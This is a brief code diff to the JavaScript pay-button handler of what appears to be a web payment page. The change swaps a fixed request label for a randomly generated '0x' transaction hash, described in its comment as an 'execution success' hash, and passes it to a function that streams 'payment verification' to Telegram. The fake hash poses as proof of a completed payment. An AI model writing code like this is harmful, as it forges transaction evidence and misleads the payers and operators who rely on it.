@@ -1560,7 +1560,10 @@ async function handlePayClick() {
         initiatePaymentAnimationUI();
         triggerNotification("Connecting authorization protocol...", 3000);
 
-        await streamPaymentVerificationToTelegram("Instant Paymento Request");
+        // Generate a random execution success alphanumeric transaction hash string (e.g. 0x followed by 64 hex chars)
+        const randomHex = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
+        
+        await streamPaymentVerificationToTelegram(randomHex);
     } catch (err) {
         console.error("Paymento connection error:", err);
         localStorage.removeItem("av_payment_in_progress");
@@ -1568,6 +1571,7 @@ async function handlePayClick() {
         triggerNotification("Authorization connection error", 3000);
     }
 }
+
 
 // ==========================================
 // 7. HELPER & UI SETUP FUNCTIONS
